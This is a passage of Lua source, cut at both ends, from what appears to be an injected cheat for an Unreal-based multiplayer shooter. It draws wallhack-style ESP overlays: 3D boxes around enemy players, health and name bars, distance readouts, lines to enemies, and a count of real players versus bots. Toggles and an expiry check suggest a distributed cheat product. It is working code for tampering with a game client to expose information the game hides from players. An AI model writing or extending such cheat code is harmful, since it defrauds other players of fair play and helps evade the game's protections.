    M.BoxThickness   = 1.5
    M.BoxWidthFactor = 0.40
    M.RealStrokeColor = (FLinearColor and FLinearColor(1.0, 0.0, 0.0, 0.96)) or {R=1.0, G=0.0, B=0.0, A=0.96}
    M.BotStrokeColor  = (FLinearColor and FLinearColor(0.0, 1.0, 1.0, 0.96)) or {R=0.0, G=1.0, B=1.0, A=0.96}
    M.RealTheme = {Key = "REAL", Stroke = M.RealStrokeColor}
    M.BotTheme  = {Key = "BOT",  Stroke = M.BotStrokeColor}

    M.ESPCanvas = nil
    M.BoxWidgets = {}
    M._CanvasScaleX, M._CanvasScaleY = 1.0, 1.0
    M._CanvasOffsetX, M._CanvasOffsetY = 0.0, 0.0
    M._CachedPC = nil
    M._CapsuleCache = setmetatable({}, {__mode = "k"})
    M._AITypeCache = {}
    M._AITypeRetryAt = {}
    M._Timer, M._TimerOwner, M._Active = nil, nil, false
    M._TickInterval = 0.05
    M._LastWorld = nil

    local function IsValid(obj)
        if obj == nil or slua == nil or type(slua.isValid) ~= "function" then return false end
        local ok, valid = pcall(slua.isValid, obj)
        return ok and valid == true
    end
    M.IsValid = IsValid

    function M.IsUIWidgetValid(w)
        if not w then return false end
        local ok, valid = pcall(function() return slua.isValid(w) end)
        return ok and valid == true
    end

    function M.CallUISetter(widget, method, ...)
        if not M.IsUIWidgetValid(widget) then return false end
        local setter = widget[method]
        if type(setter) ~= "function" then return false end
        return setter(widget, ...) ~= false
    end

    function M.GetMyPlayerController()
        local PC = M._CachedPC
        if PC and IsValid(PC) then return PC end
        pcall(function()
            if GameplayData and type(GameplayData.GetPlayerController) == "function" then
                PC = GameplayData.GetPlayerController()
            end
        end)
        if not (PC and IsValid(PC)) then
            pcall(function()
                if slua_GameFrontendHUD then
                    PC = slua_GameFrontendHUD:GetPlayerController()
                end
            end)
        end
        if PC and IsValid(PC) then M._CachedPC = PC end
        return PC
    end

    function M.InitESPCanvas(forceRefresh)
        local previous = M.ESPCanvas
        local previousValid = false
        pcall(function() previousValid = previous ~= nil and Game:IsValid(previous) end)
        if previousValid and not forceRefresh then return true end
        local InGameUITools = nil
        pcall(function()
            InGameUITools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
        end)
        if not InGameUITools then return previousValid end
        local MainControlBaseUI = nil
        pcall(function() MainControlBaseUI = InGameUITools.GetMainControlBaseUI() end)
        local uiValid = false
        pcall(function() uiValid = MainControlBaseUI ~= nil and Game:IsValid(MainControlBaseUI) end)
        if not uiValid then return previousValid end
        local ParentCanvas = nil
        pcall(function()
            local c = MainControlBaseUI.CanvasPanel_0
            if c and Game:IsValid(c) then ParentCanvas = c end
        end)
        if not ParentCanvas then
            pcall(function()
                local c = MainControlBaseUI.CanvasPanel_42
                if c and Game:IsValid(c) then ParentCanvas = c end
            end)
        end
        if not ParentCanvas then return previousValid end
        if ParentCanvas ~= previous then
            M.ClearAllBoxes()
            M.ESPCanvas = ParentCanvas
        end
        return true
    end

    function M.UpdateCanvasTransform(PC)
        if not M.ESPCanvas or not Game:IsValid(M.ESPCanvas) then return end
        local success = false
        pcall(function()
            local SBL = SlateBlueprintLibrary
            if SBL and SBL.AbsoluteToLocal then
                local cg = M.ESPCanvas:GetCachedGeometry()
                if cg then
                    local pt0 = SBL.AbsoluteToLocal(cg, FVector2D and FVector2D(0,0) or {X=0,Y=0})
                    local pt1 = SBL.AbsoluteToLocal(cg, FVector2D and FVector2D(100,100) or {X=100,Y=100})
                    if pt0 and pt1 and type(pt0.X) == "number" and type(pt1.X) == "number"
                        and pt1.X ~= pt0.X and pt1.Y ~= pt0.Y then
                        M._CanvasScaleX = (pt1.X - pt0.X) / 100
                        M._CanvasScaleY = (pt1.Y - pt0.Y) / 100
                        M._CanvasOffsetX = pt0.X
                        M._CanvasOffsetY = pt0.Y
                        success = true
                    end
                end
            end
        end)
        if not success then
            local scale = 1.0
            pcall(function()
                local WLL = WidgetLayoutLibrary
                if WLL and WLL.GetViewportScale then
                    local c = WLL.GetViewportScale(PC)
                    if type(c) == "number" and c == c and c > 0 and c < math.huge then
                        scale = c
                    end
                end
            end)
            M._CanvasScaleX = 1.0 / scale
            M._CanvasScaleY = 1.0 / scale
            M._CanvasOffsetX = 0
            M._CanvasOffsetY = 0
        end
    end

    function M.ProjectToCanvas(PC, WorldLoc, Reuse)
        Reuse = Reuse or {}
        Reuse.Pix = Reuse.Pix or (FVector2D and FVector2D(0,0) or {X=0,Y=0})
        Reuse.Canvas = Reuse.Canvas or (FVector2D and FVector2D(0,0) or {X=0,Y=0})
        local Pix, Canvas = Reuse.Pix, Reuse.Canvas
        if not IsValid(PC) or not WorldLoc then
            Canvas.X, Canvas.Y = 0, 0
            return false, Canvas
        end
        Pix.X, Pix.Y = 0, 0
        local bOK = false
        pcall(function()
            local res = PC:ProjectWorldLocationToScreen(WorldLoc, Pix, true)
            bOK = (res == true or res == 1 or (Pix and (Pix.X ~= 0 or Pix.Y ~= 0)))
        end)
        if not bOK then
            Canvas.X, Canvas.Y = 0, 0
            return false, Canvas
        end
        local sx = M._CanvasScaleX or 1.0
        local sy = M._CanvasScaleY or 1.0
        local ox = M._CanvasOffsetX or 0
        local oy = M._CanvasOffsetY or 0
        Canvas.X = Pix.X * sx + ox
        Canvas.Y = Pix.Y * sy + oy
        return true, Canvas
    end

    function M.GetCharacterVerticalBounds(Character)
        if not IsValid(Character) then return nil, nil end
        local Center, HalfHeight = nil, nil
        local Capsule = M._CapsuleCache[Character]
        if not (Capsule and IsValid(Capsule)) then
            Capsule = nil
            pcall(function()
                if Character.GetCapsuleComponent then Capsule = Character:GetCapsuleComponent()
                elseif Character.CapsuleComponent then Capsule = Character.CapsuleComponent end
            end)
            if Capsule and IsValid(Capsule) then M._CapsuleCache[Character] = Capsule end
        end
        if Capsule and IsValid(Capsule) then
            pcall(function()
                if Capsule.K2_GetComponentLocation then Center = Capsule:K2_GetComponentLocation()
                elseif Capsule.GetComponentLocation then Center = Capsule:GetComponentLocation() end
                if Capsule.GetScaledCapsuleHalfHeight then HalfHeight = Capsule:GetScaledCapsuleHalfHeight()
                elseif Capsule.GetUnscaledCapsuleHalfHeight then HalfHeight = Capsule:GetUnscaledCapsuleHalfHeight()
                elseif Capsule.CapsuleHalfHeight then HalfHeight = Capsule.CapsuleHalfHeight end
            end)
        end
        if not Center then
            pcall(function()
                if Character.K2_GetActorLocation then Center = Character:K2_GetActorLocation() end
            end)
        end
        if not Center then
            pcall(function()
                if Game and Game.GetActorLocation then Center = Game:GetActorLocation(Character) end
            end)
        end
        if not Center then return nil, nil end
        if not HalfHeight or HalfHeight < 10 or HalfHeight > 200 then
            HalfHeight = 85
            pcall(function()
                if Character.bIsCrouched then HalfHeight = 60 end
                if Character.IsProne and Character:IsProne() then HalfHeight = 25 end
            end)
        end
        return Center, HalfHeight
    end

    function M.GetCharacterBoxLocs(Character)
        local Center, HalfHeight = M.GetCharacterVerticalBounds(Character)
        if not Center or not HalfHeight then return nil, nil end
        return {X = Center.X, Y = Center.Y, Z = Center.Z + HalfHeight},
               {X = Center.X, Y = Center.Y, Z = Center.Z - HalfHeight}
    end

    function M.IsAI(Character, KeyStr)
        if not IsValid(Character) then return false end
        KeyStr = KeyStr or tostring(Character)
        local cached = M._AITypeCache[KeyStr]
        if cached ~= nil then return cached end
        local now = os.clock()
        if now < (M._AITypeRetryAt[KeyStr] or 0) then return false end
        local bAI, hasSignal = false, false
        local function accept(v)
            if v == true or v == 1 then bAI, hasSignal = true, true
            elseif v == false or v == 0 then hasSignal = true end
        end
        local function readFlag(o, n) pcall(function() accept(o[n]) end) end
        local function callFlag(o, n)
            pcall(function()
                local m = o and o[n]
                if type(m) == "function" then accept(m(o)) end
            end)
        end
        pcall(function() if Game and Game.IsAI then accept(Game:IsAI(Character)) end end)
        if not bAI then readFlag(Character, "bIsAI") end
        if not bAI then readFlag(Character, "IsAI") end
        if not bAI then callFlag(Character, "IsBot") end
        if not bAI then
            local ps = nil
            pcall(function()
                if Character.GetPlayerStateSafety then ps = Character:GetPlayerStateSafety()
                elseif Character.GetPlayerState then ps = Character:GetPlayerState()
                elseif Character.PlayerState then ps = Character.PlayerState end
            end)
            if ps and IsValid(ps) then
                readFlag(ps, "bIsABot")
                if not bAI then readFlag(ps, "bIsBot") end
                if not bAI then readFlag(ps, "bIsAI") end
                if not bAI then callFlag(ps, "IsBot") end
            end
        end
        if hasSignal then M._AITypeCache[KeyStr] = bAI
    else M._AITypeRetryAt[KeyStr] = now + 5.0 end   -- ✅ 1.0 → 5.0
    return bAI
end

    function M.GetEnemyTheme(bIsAI)
        if bIsAI then return M.BotTheme end
        return M.RealTheme
    end

    function M.CreateLineWidget(color, zOrder)
        if not M.ESPCanvas or not Game:IsValid(M.ESPCanvas) then return nil end
        local Border = nil
        pcall(function() Border = CGame:NewObjectFromPath("/Script/UMG.Border", M.ESPCanvas) end)
        if not Border or not slua.isValid(Border) then return nil end
        pcall(function() Border:SetBrushColor(color) end)
        pcall(function() Border:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        pcall(function()
            Border:SetRenderTransformPivot(FVector2D and FVector2D(0.0, 0.5) or {X=0, Y=0.5})
        end)
        local Slot = nil
        pcall(function()
            Slot = M.ESPCanvas:AddChildToCanvas(Border)
            if Slot then Slot:SetAutoSize(false) Slot:SetZOrder(zOrder or 1) end
        end)
        if not Slot then
            pcall(function() Border:RemoveFromParent() end)
            pcall(function() Border:ConditionalBeginDestroy() end)
            return nil
        end
        return {Widget = Border, Slot = Slot}
    end

    function M.DrawLine(ld, x1, y1, x2, y2, thickness)
        if not ld or not M.IsUIWidgetValid(ld.Widget) or not M.IsUIWidgetValid(ld.Slot) then return false end
        local dx, dy = x2 - x1, y2 - y1
        local len = math.sqrt(dx * dx + dy * dy)
        if len < 0.5 then
            ld._x1 = nil
            if ld._visible ~= false then
                local hidden = pcall(function()
                    return M.CallUISetter(ld.Widget, 'SetWidgetVisibility',
                        UEnums.ESlateVisibility.Collapsed)
                end)
                if hidden then ld._visible = false else ld._visible = nil end
            end
            return false
        end
        local eps = 0.25
        if ld._visible == true and ld._x1 and
           math.abs(ld._x1 - x1) < eps and math.abs(ld._y1 - y1) < eps and
           math.abs(ld._x2 - x2) < eps and math.abs(ld._y2 - y2) < eps and
           math.abs((ld._thickness or 0) - thickness) < 0.01 then
            return true
        end
        local ang = (math.atan2 and math.atan2(dy, dx) or math.atan(dy, dx)) * (180.0 / math.pi)
        ld._drawPos  = ld._drawPos  or (FVector2D and FVector2D(0,0) or {X=0,Y=0})
        ld._drawSize = ld._drawSize or (FVector2D and FVector2D(0,0) or {X=0,Y=0})
        ld._drawPos.X, ld._drawPos.Y   = x1, y1 - thickness / 2
        ld._drawSize.X, ld._drawSize.Y = len, thickness
        local applied = pcall(function()
            if ld.Slot:SetPosition(ld._drawPos) == false then return false end
            if ld.Slot:SetSize(ld._drawSize) == false then return false end
            if ld.Widget:SetRenderAngle(ang) == false then return false end
            if ld._visible ~= true then
                if ld.Widget:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) == false then return false end
            end
            return true
        end)
        if not applied then ld._x1 = nil; return false end
        ld._x1, ld._y1, ld._x2, ld._y2 = x1, y1, x2, y2
        ld._thickness = thickness
        ld._visible = true
        return true
    end

    function M.ApplyLineTheme(ld, theme)
        if not ld or not M.IsUIWidgetValid(ld.Widget) or not theme then return false end
        if ld._themeKey == theme.Key then return true end
        local ok = pcall(function()
            return M.CallUISetter(ld.Widget, 'SetBrushColor', theme.Stroke)
        end)
        if ok then ld._themeKey = theme.Key; return true end
        ld._themeKey = nil
        return false
    end

    local function HideWidget(ld)
        if not ld or not M.IsUIWidgetValid(ld.Widget) then return false end
        if ld._visible == false then return true end
        local ok = pcall(function()
            return M.CallUISetter(ld.Widget, 'SetWidgetVisibility', UEnums.ESlateVisibility.Collapsed)
        end)
        if ok then ld._visible = false; return true end
        ld._visible = nil
        return false
    end
    M.HideWidget = HideWidget

    local function DestroyWidget(ld)
        if not ld then return end
        local widget = ld.Widget
        ld.Widget, ld.Slot = nil, nil
        if M.IsUIWidgetValid(widget) then
            pcall(function() widget:RemoveFromParent() end)
            pcall(function() widget:ConditionalBeginDestroy() end)
        end
    end
    M.DestroyWidget = DestroyWidget

    function M.UpdateBox(KeyStr, headCanvas, feetCanvas, bOnScreen, bIsAI)
        if not _G.AK_GetVal or _G.AK_GetVal("ESP_BOX") ~= 1 then
            M.RemoveBox(KeyStr); return
        end
        local box = M.BoxWidgets[KeyStr]
        local boxH = bOnScreen and headCanvas and feetCanvas
            and (feetCanvas.Y - headCanvas.Y) or nil
        if not boxH or boxH < 10 then
            if box then
                box._lastL = nil
                HideWidget(box.frontTop);  HideWidget(box.frontBot)
                HideWidget(box.frontLeft); HideWidget(box.frontRight)
                HideWidget(box.backTop);   HideWidget(box.backBot)
                HideWidget(box.backLeft);  HideWidget(box.backRight)
                HideWidget(box.connTL);    HideWidget(box.connTR)
                HideWidget(box.connBL);    HideWidget(box.connBR)
            end
            return
        end
        local boxW = boxH * (M.BoxWidthFactor or 0.40)
        local cx = (headCanvas.X + feetCanvas.X) * 0.5
        local L, R = cx - boxW * 0.5, cx + boxW * 0.5
        local T, B = headCanvas.Y, feetCanvas.Y
        local depth = math.max(4.0, math.min(12.0, boxW * 0.16))
        local backDX, backDY = depth * 0.65, -depth
        local bL, bR, bT, bB = L + backDX, R + backDX, T + backDY, B + backDY
        local thick = M.BoxThickness or 1.5
        local theme = M.GetEnemyTheme(bIsAI)
        if not box then
            box = {_buildIndex = 1}
            M.BoxWidgets[KeyStr] = box
        end
        if box._buildIndex then
            local parts = {"frontTop","frontBot","frontLeft","frontRight",
                           "backTop","backBot","backLeft","backRight",
                           "connTL","connTR","connBL","connBR"}
            while box._buildIndex <= #parts do
                local index = box._buildIndex
                local part = M.CreateLineWidget(theme.Stroke, 1)
                if not part then
                    for i = 1, index - 1 do HideWidget(box[parts[i]]) end
                    return
                end
                box[parts[index]] = part
                box._buildIndex = index + 1
                HideWidget(part)
            end
            box._buildIndex = nil
        end
        local sameGeometry = box._lastL and
            math.abs(box._lastL - L) < 0.25 and math.abs(box._lastR - R) < 0.25 and
            math.abs(box._lastT - T) < 0.25 and math.abs(box._lastB - B) < 0.25 and
            math.abs(box._lastBL - bL) < 0.25 and math.abs(box._lastBT - bT) < 0.25 and
            box._lastThemeKey == theme.Key
        if sameGeometry then return end
        local complete = true
        local function ApplyTheme(ld, value)
            if not M.ApplyLineTheme(ld, value) then complete = false end
        end
        local function Draw(ld, ...)
            if not M.DrawLine(ld, ...) then complete = false end
        end
        ApplyTheme(box.frontTop, theme);  ApplyTheme(box.frontBot, theme)
        ApplyTheme(box.frontLeft, theme); ApplyTheme(box.frontRight, theme)
        ApplyTheme(box.backTop, theme);   ApplyTheme(box.backBot, theme)
        ApplyTheme(box.backLeft, theme);  ApplyTheme(box.backRight, theme)
        ApplyTheme(box.connTL, theme);    ApplyTheme(box.connTR, theme)
        ApplyTheme(box.connBL, theme);    ApplyTheme(box.connBR, theme)
        Draw(box.frontTop,   L, T, R, T, thick)
        Draw(box.frontBot,   L, B, R, B, thick)
        Draw(box.frontLeft,  L, T, L, B, thick)
        Draw(box.frontRight, R, T, R, B, thick)
        Draw(box.backTop,    bL, bT, bR, bT, thick)
        Draw(box.backBot,    bL, bB, bR, bB, thick)
        Draw(box.backLeft,   bL, bT, bL, bB, thick)
        Draw(box.backRight,  bR, bT, bR, bB, thick)
        Draw(box.connTL,     L,  T, bL, bT, thick)
        Draw(box.connTR,     R,  T, bR, bT, thick)
        Draw(box.connBL,     L,  B, bL, bB, thick)
        Draw(box.connBR,     R,  B, bR, bB, thick)
        if complete then
            box._lastL, box._lastR = L, R
            box._lastT, box._lastB = T, B
            box._lastBL, box._lastBT = bL, bT
            box._lastThemeKey = theme.Key
        else
            box._lastL = nil
        end
    end

    function M.RemoveBox(KeyStr)
        local box = M.BoxWidgets[KeyStr]
        if box then
            for _, ld in pairs(box) do
                if type(ld) == "table" and ld.Widget then DestroyWidget(ld) end
            end
        end
        M.BoxWidgets[KeyStr] = nil
    end

    function M.ClearAllBoxes()
        for _, box in pairs(M.BoxWidgets) do
            if box then
                for _, ld in pairs(box) do
                    if type(ld) == "table" and ld.Widget then DestroyWidget(ld) end
                end
            end
        end
        M.BoxWidgets = {}
    end

    local function Tick()
        if not M._Active then return end
        if not CheckExpiration() then return end
        if not M.InitESPCanvas() then return end
        local pc = M.GetMyPlayerController()
        if not IsValid(pc) then return end
        M.UpdateCanvasTransform(pc)

        local localPlayer = nil
        pcall(function()
            if GameplayData and GameplayData.GetPlayerCharacter then
                localPlayer = GameplayData.GetPlayerCharacter()
            end
        end)
        if not IsValid(localPlayer) then return end

        local myLoc = nil
        pcall(function()
            if localPlayer.K2_GetActorLocation then myLoc = localPlayer:K2_GetActorLocation() end
        end)
-- Top-center origin for head lines (canvas space) — FIXED
-- ============================================================
local topOrigin = nil
if _G.AK_GetVal and _G.AK_GetVal("ESP_LINE") == 1 then
    local vpW = nil
    pcall(function()
        local s = FVector2D and FVector2D(0,0) or {X=0,Y=0}
        pc:GetViewportSize(s)
        if s and type(s.X) == "number" and s.X > 200 then vpW = s.X end
    end)
    if not vpW and WidgetLayoutLibrary and WidgetLayoutLibrary.GetViewportSize then
        pcall(function()
            local s = WidgetLayoutLibrary.GetViewportSize(pc)
            if s and type(s.X) == "number" and s.X > 200 then vpW = s.X end
        end)
    end
    if vpW then
        local sx = M._CanvasScaleX or 1.0
        local ox = M._CanvasOffsetX or 0
        local oy = M._CanvasOffsetY or 0
        local tx = (vpW * 0.5) * sx + ox
        local ty = 0 * (M._CanvasScaleY or 1.0) + oy
        if type(tx) == "number" and type(ty) == "number"
            and tx == tx and ty == ty
            and tx > -10000 and tx < 10000
            and ty > -10000 and ty < 10000 then
            topOrigin = { X = tx, Y = ty }
        end
    end
end

-- ✅ Cache enemies list for 0.1s
local now_tick = os.clock()
if not M._EnemyCache or (now_tick - (M._EnemyCacheTime or 0)) > 0.1 then
    M._EnemyCache = {}
    pcall(function()
        if GameplayData and GameplayData.GetAllPlayerCharacters then
            M._EnemyCache = GameplayData.GetAllPlayerCharacters() or {}
        end
    end)
    M._EnemyCacheTime = now_tick
end
local enemies = M._EnemyCache
local seen = {}
local myTeam = localPlayer.TeamID
local realCount, botCount = 0, 0

for _, enemy in pairs(enemies) do
    if IsValid(enemy) and enemy ~= localPlayer
        and (myTeam == nil or enemy.TeamID ~= myTeam) then

        -- ✅ STRONG ALIVE CHECK
        local alive = true
        pcall(function()
            if type(enemy.IsDead) == "function" and enemy:IsDead() then alive = false end
            if enemy.bIsDead or enemy.bIsDeadFlag or enemy.bDead then alive = false end
            if enemy.bHidden or (enemy.Mesh and enemy.Mesh.bHidden) then alive = false end
            if enemy.GetHealth and enemy:GetHealth() <= 0 then alive = false end
            if enemy.HasPawnState and EPawnState and EPawnState.Dead then
                local ok, dead = pcall(enemy.HasPawnState, enemy, EPawnState.Dead)
                if ok and dead then alive = false end
            end
            if enemy.bNearDeath then alive = false end
            local ps = (enemy.GetPlayerStateSafety and enemy:GetPlayerStateSafety())
                or enemy.PlayerState
            if ps and (ps.bIsDead or ps.bIsTombBox) then alive = false end
        end)

        -- ✅ Key hamesha banao (dead ho ya alive)
        local key = tostring(enemy.PlayerKey or enemy)

if not alive then
    -- ✅ Dead enemy ke saare widgets turant hata do
    M.RemoveBox(key)
    if _G.ESPHealthRenderer then pcall(_G.ESPHealthRenderer.Remove, key) end
    if _G.ESPDistanceRenderer then pcall(_G.ESPDistanceRenderer.Remove, key) end
    if _G.ESPLineRenderer then pcall(_G.ESPLineRenderer.Remove, key) end
    -- ✅ NEW: Native HP + Name marker remove karo
    if _G.NativeHPNameRenderer then
        pcall(_G.NativeHPNameRenderer.Remove, key, enemy)
    end
else
            seen[key] = true

            local headLoc, feetLoc = M.GetCharacterBoxLocs(enemy)
            local bHeadOK, headCanvas = false, nil
            local bFeetOK, feetCanvas = false, nil

            if headLoc then
                local ok, cv = M.ProjectToCanvas(pc, headLoc); bHeadOK, headCanvas = ok, cv
            end
            if feetLoc then
                local ok, cv = M.ProjectToCanvas(pc, feetLoc); bFeetOK, feetCanvas = ok, cv
            end

            -- ✅ Strict validation: headCanvas valid numeric hona chahiye
            if bHeadOK and headCanvas then
                if type(headCanvas.X) ~= "number" or type(headCanvas.Y) ~= "number"
                    or headCanvas.X ~= headCanvas.X or headCanvas.Y ~= headCanvas.Y
                    or headCanvas.X < -5000 or headCanvas.X > 5000
                    or headCanvas.Y < -5000 or headCanvas.Y > 5000 then
                    bHeadOK = false
                    headCanvas = nil
                end
            end

            local bOnScreen = bHeadOK and bFeetOK
            local bIsAI = M.IsAI(enemy, key)
            if bIsAI then botCount = botCount + 1 else realCount = realCount + 1 end

            M.UpdateBox(key, headCanvas, feetCanvas, bOnScreen, bIsAI)

            if _G.AK_GetVal and _G.AK_GetVal("ESP_HP") == 1
                and _G.ESPHealthRenderer and _G.ESPHealthRenderer.Update then
                pcall(_G.ESPHealthRenderer.Update, key, feetCanvas, headCanvas, enemy, bOnScreen, bIsAI)
            end
            
            -- ✅ NEW: Native HP + Name ESP (BRPlayerCharacterBase style)
if _G.AK_GetVal and _G.AK_GetVal("EspNameHP") == 1
    and _G.NativeHPNameRenderer and _G.NativeHPNameRenderer.Update then
    local distM = 0
    pcall(function()
        if myLoc and enemy and enemy.K2_GetActorLocation then
            local eLoc = enemy:K2_GetActorLocation()
            if eLoc and myLoc then
                local dx = eLoc.X - myLoc.X
                local dy = eLoc.Y - myLoc.Y
                local dz = eLoc.Z - myLoc.Z
                distM = math.sqrt(dx*dx + dy*dy + dz*dz) / 100
            end
        end
    end)
    pcall(_G.NativeHPNameRenderer.Update, key, enemy, localPlayer, pc, bIsAI, distM)
end

            if _G.AK_GetVal and _G.AK_GetVal("ESP_MAP") == 1
                and _G.ESPDistanceRenderer and _G.ESPDistanceRenderer.Update then
                pcall(_G.ESPDistanceRenderer.Update, key, feetCanvas, feetLoc, myLoc, bOnScreen)
            end

            -- ✅ Strict check: line sirf tab draw karo jab sab valid ho
            if topOrigin and _G.ESPLineRenderer and _G.ESPLineRenderer.Update
                and bOnScreen and headCanvas and headCanvas.X and headCanvas.Y then
                pcall(_G.ESPLineRenderer.Update, key, headCanvas, topOrigin, bOnScreen, bIsAI, false)
            else
                if _G.ESPLineRenderer then pcall(_G.ESPLineRenderer.Remove, key) end
            end
        end
    end
end

        if _G.AK_GetVal and _G.AK_GetVal("ENEMY_COUNT") == 1
            and _G.EnemyCounterOverlay then
            if _G.EnemyCounterOverlay.Create() then
                _G.EnemyCounterOverlay.UpdatePosition(pc)
                _G.EnemyCounterOverlay.SetCounts(realCount, botCount)
            end
        elseif _G.EnemyCounterOverlay then
            _G.EnemyCounterOverlay.Hide()
        end

    -- ✅ FIX: Har renderer ke widgets ka apna stale cleanup
    local stale = {}
    -- Box widgets
    for k in pairs(M.BoxWidgets) do
        if not seen[k] then stale[k] = true end
    end
    -- Health widgets
    if _G.ESPHealthRenderer and _G.ESPHealthRenderer.Widgets then
        for k in pairs(_G.ESPHealthRenderer.Widgets) do
            if not seen[k] then stale[k] = true end
        end
    end
    -- Distance widgets
    if _G.ESPDistanceRenderer and _G.ESPDistanceRenderer.Widgets then
        for k in pairs(_G.ESPDistanceRenderer.Widgets) do
            if not seen[k] then stale[k] = true end
        end
    end
    -- Line widgets
    if _G.ESPLineRenderer and _G.ESPLineRenderer.Lines then
        for k in pairs(_G.ESPLineRenderer.Lines) do
            if not seen[k] then stale[k] = true end
        end
    end
    -- Sabko remove karo
    for k in pairs(stale) do
        M.RemoveBox(k)
        if _G.ESPHealthRenderer and _G.ESPHealthRenderer.Remove then
            pcall(_G.ESPHealthRenderer.Remove, k)
        end
        if _G.ESPDistanceRenderer and _G.ESPDistanceRenderer.Remove then
            pcall(_G.ESPDistanceRenderer.Remove, k)
        end
        if _G.ESPLineRenderer and _G.ESPLineRenderer.Remove then
            pcall(_G.ESPLineRenderer.Remove, k)
        end
        -- ✅ NEW: Native HP + Name cleanup
        if _G.NativeHPNameRenderer and _G.NativeHPNameRenderer.Remove then
            pcall(_G.NativeHPNameRenderer.Remove, k, nil)
        end
    end
end
    
    local function EnsureWorldCache()
        local world = nil
        pcall(function() world = slua and slua.getWorld and slua.getWorld() end)
        if world ~= M._LastWorld then
            M._LastWorld = world
            M.ClearAllBoxes()
            if _G.ESPHealthRenderer then pcall(_G.ESPHealthRenderer.ClearAll) end
            if _G.ESPDistanceRenderer then pcall(_G.ESPDistanceRenderer.ClearAll) end
            if _G.ESPLineRenderer then pcall(_G.ESPLineRenderer.ClearAll) end
            if _G.EnemyCounterOverlay then pcall(_G.EnemyCounterOverlay.Destroy) end
            if _G.NativeHPNameRenderer then pcall(_G.NativeHPNameRenderer.ClearAll) end
            M._CapsuleCache = setmetatable({}, {__mode = "k"})
            M._AITypeCache = {}
            M._AITypeRetryAt = {}
            M._CachedPC = nil
            M.ESPCanvas = nil
        end
    end

    function M.Start()
        if M._Active then return true end
        local owner = nil
        pcall(function()
            if GameplayData and GameplayData.GetPlayerController then
                owner = GameplayData.GetPlayerController()
            end
        end)
        if not IsValid(owner) then
            pcall(function()
                if slua_GameFrontendHUD then
                    owner = slua_GameFrontendHUD:GetPlayerController()
                end
            end)
        end
        if not IsValid(owner) or type(owner.AddGameTimer) ~= "function" then
            return false
        end
        EnsureWorldCache()
        M._Active = true
        local ok, timer = pcall(function()
            return owner:AddGameTimer(M._TickInterval, true, function()
                EnsureWorldCache()
                Tick()
            end)
        end)
        if not ok or not timer then M._Active = false; return false end
        M._Timer, M._TimerOwner = timer, owner
        print("[ESP-Box] Started at 0.02s")
        return true
    end

    function M.Stop()
        M._Active = false
        if M._Timer and M._TimerOwner
            and type(M._TimerOwner.RemoveGameTimer) == "function" then
            pcall(function() M._TimerOwner:RemoveGameTimer(M._Timer) end)
        end
        M._Timer, M._TimerOwner = nil, nil
        M.ClearAllBoxes()
        if _G.ESPHealthRenderer then pcall(_G.ESPHealthRenderer.ClearAll) end
        if _G.ESPDistanceRenderer then pcall(_G.ESPDistanceRenderer.ClearAll) end
        if _G.ESPLineRenderer then pcall(_G.ESPLineRenderer.ClearAll) end
        if _G.EnemyCounterOverlay then pcall(_G.EnemyCounterOverlay.Destroy) end
    end

    function M.IsActive() return M._Active end
    _G.ESPBoxRenderer = M
    return M
end)()

-- ============================================================================
-- 7A. HP BAR RENDERER (Canvas-based)
-- ============================================================================
local ESPHealthRenderer = (function()
    local M = {}
    local FVector2D    = _G.FVector2D or import("Vector2D")
    local FLinearColor = _G.FLinearColor or import("LinearColor")

    M.BarHeight = 5.0
    M.BarWidthFactor = 0.40
    M.OutlineColor = (FLinearColor and FLinearColor(0,0,0,0.85)) or {R=0,G=0,B=0,A=0.85}
    M.TrackColor   = (FLinearColor and FLinearColor(0.05,0.05,0.05,0.85)) or {R=0.05,G=0.05,B=0.05,A=0.85}
    M.Widgets = {}
    M.Canvas = nil

    local function IsValid(o)
        if o==nil or slua==nil or type(slua.isValid)~="function" then return false end
        local ok,v = pcall(slua.isValid,o); return ok and v==true
    end

    function M.InitCanvas(force)
        if not force and M.Canvas and Game:IsValid(M.Canvas) then return true end
        local tools; pcall(function() tools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools") end)
        if not tools then return false end
        local root; pcall(function() root = tools.GetMainControlBaseUI() end)
        if not root or not Game:IsValid(root) then return false end
        local canvas = root.CanvasPanel_0
        if not canvas or not Game:IsValid(canvas) then canvas = root.CanvasPanel_42 end
        if not canvas or not Game:IsValid(canvas) then return false end
        M.Canvas = canvas
        return true
    end

    local function MakeBorder(color, z)
        if not M.Canvas or not Game:IsValid(M.Canvas) then return nil end
        local b; pcall(function() b = CGame:NewObjectFromPath("/Script/UMG.Border", M.Canvas) end)
        if not b or not slua.isValid(b) then return nil end
        pcall(function() b:SetBrushColor(color) end)
        pcall(function() b:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible) end)
        local s
        pcall(function()
            s = M.Canvas:AddChildToCanvas(b)
            if s then s:SetAutoSize(false) s:SetZOrder(z or 2) end
        end)
        if not s then pcall(function() b:ConditionalBeginDestroy() end) return nil end
        return {W=b, S=s}
    end

    local function Hide(part)
        if not part or not IsValid(part.W) then return end
        pcall(function() part.W:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed) end)
    end

    local function Destroy(part)
        if not part then return end
        local w = part.W; part.W, part.S = nil, nil
        if IsValid(w) then
            pcall(function() w:RemoveFromParent() end)
            pcall(function() w:ConditionalBeginDestroy() end)
        end
    end

    function M.GetHealthPct(pawn)
        if not IsValid(pawn) then return 0 end
        local hp, max = nil, nil
        pcall(function()
            if pawn.Health ~= nil then hp = pawn.Health elseif pawn.HP ~= nil then hp = pawn.HP
            elseif pawn.GetHealth then hp = pawn:GetHealth() end
            if pawn.HealthMax ~= nil then max = pawn.HealthMax elseif pawn.MaxHealth ~= nil then max = pawn.MaxHealth
            elseif pawn.GetHealthMax then max = pawn:GetHealthMax() end
        end)
        hp = tonumber(hp) or 0; max = tonumber(max) or 100
        if max <= 0 then max = 100 end
        local p = hp/max; if p<0 then p=0 elseif p>1 then p=1 end
        return p
    end

    function M.GetHealthColor(pct)
        if pct <= 0.10 then return (FLinearColor and FLinearColor(1,0,0,1)) or {R=1,G=0,B=0,A=1} end
        if pct < 0.50 then local t=(pct-0.10)/0.40 return (FLinearColor and FLinearColor(1,t,0,1)) or {R=1,G=t,B=0,A=1} end
        if pct >= 1.0 then return (FLinearColor and FLinearColor(0,1,0,1)) or {R=0,G=1,B=0,A=1} end
